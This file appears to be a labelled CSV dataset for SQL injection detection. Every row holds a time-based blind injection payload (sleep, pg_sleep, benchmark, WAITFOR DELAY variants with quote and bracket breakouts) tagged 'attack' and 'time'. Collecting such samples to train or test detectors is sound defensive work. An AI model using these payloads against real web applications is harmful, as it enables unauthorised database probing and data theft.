label,payload,family
attack,"1  )   or benchmark  (  10000000,MD5  (  1   )    )   #",time
attack,1  )   or pg_sleep  (  __TIME__  )  --,time
attack,"""   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",time
attack,"  )   or benchmark  (  10000000,MD5  (  1   )    )   #",time
attack,sleep 50',time
attack,1 or sleep  (  __TIME__  )  #,time
attack,""" or benchmark  (  10000000,MD5  (  1   )    )   #",time
attack,or pg_sleep  (  __TIME__  )  --,time
attack,"benchmark  (  10000000,MD5  (  1   )    )   #",time
attack,"1""  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  ""jozh""  =  ""jozh",time
attack,"1   )    )    as potk where 5040  =  5040 or elt  (  5873  =  5873,sleep  (  5   )    )   #",time
attack,"select pg_sleep  (  5  )   and   (  ""%""  =  """,time
attack,"1""   )    )    and elt  (  3114  =  3114,sleep  (  5   )    )   #",time
attack,1' where 7191  =  7191 rlike sleep  (  5  )  --,time
attack,"1""  )   where 1330  =  1330 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  --",time
attack,"1%""   )    )     )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",time
attack,"1""   )    )     )   or elt  (  5873  =  5873,sleep  (  5   )    )   #",time
attack,"1"" or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and ""pxix""  =  ""pxix",time
attack,"1   )    )    as nxdf where 1696  =  1696 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",time
attack,1 where 5691  =  5691 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  --,time
attack," select sleep  (  5  )   and ""cyrb""  =  ""cyrb",time
attack,1' or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and 'dogx'  =  'dogx,time
attack,1   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,time
attack,"1""  )   where 3122  =  3122 and sleep  (  5  )  #",time
attack,"1"" where 2035  =  2035 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",time
attack,1'  )   where 6244  =  6244 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --,time
attack,"1""   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (   ""imlq"" like ""imlq",time
attack,"1'+  (  select 'zirh' where 9054  =  9054 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )     )  +'",time
attack,"1'||  (  select 'cjwp' where 8681  =  8681 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )     )  ||'",time
attack,"1'  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and   (  'ffzv'  =  'ffzv",time
attack,"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (   ""xeki"" like ""xeki",time
attack,1 or sleep  (  5  )  # tdgb,time
attack,"1'+  (  select 'arzm' where 6464  =  6464 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )     )  +'",time
attack,select sleep  (  5  )   and   (  'hhlq' like 'hhlq,time
attack,1'  )   as qcse where 4147  =  4147 waitfor delay '0:0:5'--,time
attack,1   )    )    and sleep  (  5  )  #,time
attack,1'  )   where 2208  =  2208 rlike sleep  (  5  )  #,time
attack,"1""   )    )     )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (     (  ""enfu""  =  ""enfu",time
attack,"1 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",time
attack,1'   )    )    as dcen where 5852  =  5852 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  --,time
attack,"1'  )   as wpom where 2620  =  2620 and elt  (  3114  =  3114,sleep  (  5   )    )   #",time
attack,"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and ""wsmz"" like ""wsmz",time
attack,1'  )   as ncou where 9166  =  9166 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  --,time
attack,1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,time
attack,1  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and   (  7079  =  7079,time
attack,"1'+  (  select rdpe where 6553  =  6553 or elt  (  6272  =  6272,sleep  (  5   )    )     )  +'",time
attack,"1""   )    )     )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (     (  ""zgoy"" like ""zgoy",time
attack,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  ""hgds"" like ""hgds",time
attack,"1%""   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",time
attack,"1""  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and   (  ""qkds"" like ""qkds",time
attack,"1""  )   as wsyv where 8142  =  8142 rlike sleep  (  5  )  #",time
attack,1%' or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and '%'  =  ',time
attack,1' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and 'lqsa' like 'lqsa,time
attack,select sleep  (  5  )   and   (  'labj'  =  'labj,time
attack,1'  )   as gsjr where 7046  =  7046 and sleep  (  5  )  #,time
attack,1'  )   rlike sleep  (  5  )   and   (  'tslp'  =  'tslp,time
attack,"1%'   )    )     )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",time
attack,"1%"" and elt  (  3114  =  3114,sleep  (  5   )    )   #",time
attack,select pg_sleep  (  5  )  # pjvi,time
attack,"1' in boolean mode  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   #",time
attack,1'  )   as jrqh where 6204  =  6204 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,time
attack,1'||  (  select 'miew' where 8360  =  8360 waitfor delay '0:0:5'  )  ||',time
attack,1  )   or sleep  (  5  ) ,time
attack,"1""  )   where 2656  =  2656 or sleep  (  5  )  --",time
attack,"1'   )    )    and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",time
attack,"1  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  6786  =  6786",time
attack,"1""   )    )     )   or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (     (  ""hxgu""  =  ""hxgu",time
attack,select sleep  (  5  )  -- hlgt,time
attack,"1"" where 9014  =  9014 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --",time
attack,1'   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (     (  'lajk'  =  'lajk,time
attack,1'   )    )     )   rlike sleep  (  5  )   and    (    (     (  'rozr' like 'rozr,time
attack,"1""  )   as zovk where 4591  =  4591 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",time
attack,"1%""  )   or elt  (  5873  =  5873,sleep  (  5   )    )   #",time
attack,"1%""   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",time
attack,1   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (   5171  =  5171,time
attack,"1"" or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and ""vnei"" like ""vnei",time
attack,waitfor delay '0:0:5'-- thuo,time
attack,1' or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and 'ejdk' like 'ejdk,time
attack,1'||  (  select 'exls' where 3837  =  3837 and sleep  (  5   )    )   ||',time
attack,"1""  )   where 2680  =  2680 or elt  (  5873  =  5873,sleep  (  5   )    )   #",time
attack,1'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and   (  'dqoz' like 'dqoz,time
attack,1'  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    ) ,time
attack,"1 and elt  (  3114  =  3114,sleep  (  5   )    )   #",time
attack,1' or sleep  (  5  )  #,time
attack,"1""   )    )    as tybm where 2687  =  2687 or elt  (  5873  =  5873,sleep  (  5   )    )   #",time
attack,"1' in boolean mode  )   or elt  (  5873  =  5873,sleep  (  5   )    )   #",time
attack,1 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   -- yczq,time
attack,"1'||  (  select 'rqzu' from dual where 9516  =  9516 or elt  (  5873  =  5873,sleep  (  5   )    )   #",time
attack,"1' and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",time
attack,1 waitfor delay '0:0:5'-- nnnp,time
attack,1'   )    )    waitfor delay '0:0:5'--,time
attack,1'  )   or sleep  (  5  )  #,time
attack,1'+  (  select gthp where 7311  =  7311 or sleep  (  5  )  #,time
attack,"1"" where 4597  =  4597 rlike sleep  (  5  )  --",time
attack,select sleep  (  5  )   and    (    (     (  5552  =  5552,time
attack,select pg_sleep  (  5  )   and    (    (     (  'mgbm' like 'mgbm,time
attack,1%'   )    )     )   waitfor delay '0:0:5' and    (    (     (  '%'  =  ',time
attack,1 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  # bkjl,time
attack,"1""  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",time
attack,1'   )    )    as fqia where 1936  =  1936 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  --,time
attack,waitfor delay '0:0:5' and   (  'gpqx' like 'gpqx,time
attack,"1'  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  'gtov' like 'gtov",time
attack,"1  )   or elt  (  6272  =  6272,sleep  (  5   )    )   ",time
attack, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq   )    )   ||',time
attack,"1%""   )    )    or sleep  (  5  )  #",time
attack,1 where 2384  =  2384 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,time
attack,"1""  )   and sleep  (  5  )   and   (  ""ytof""  =  ""ytof",time
attack,1  )   where 3565  =  3565 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --,time
attack,"1"" where 9760  =  9760 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",time
attack,"1'  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  'yznd' like 'yznd",time
attack,1' where 2913  =  2913 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  --,time
attack,select pg_sleep  (  5  )   and    (    (     (  'qslr'  =  'qslr,time
attack,1'   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,time
attack,1'   )    )    or sleep  (  5  )   and    (    (   'taaj'  =  'taaj,time
attack,"1' where 7125  =  7125 or elt  (  6272  =  6272,sleep  (  5   )    )   --",time
attack,"1%"" rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and ""%""  =  """,time
attack,select pg_sleep  (  5   )    )   ||',time
attack,1 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,time
attack,1'  )   rlike sleep  (  5  )   and   (  'boto'  =  'boto,time
attack,"1'||  (  select 'pzoe' where 2977  =  2977 and elt  (  3114  =  3114,sleep  (  5   )    )   #",time
attack,1' waitfor delay '0:0:5' and 'jree'  =  'jree,time
attack, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (     (  'jirc'  =  'jirc,time
attack,1'||  (  select 'scct' where 2587  =  2587 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno   )    )   ||',time
attack,"1'   )    )    and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (   'inrm' like 'inrm",time
attack,1'  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  'nqol'  =  'nqol,time
attack,1 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  # ewsz,time
attack,1'   )    )     )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (     (  'odsl' like 'odsl,time
attack,1'  )   where 1424  =  1424 and sleep  (  5  )  --,time
attack,1 where 6523  =  6523 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,time
attack,1%' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and '%'  =  ',time
attack,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (     (  'lijy'  =  'lijy",time
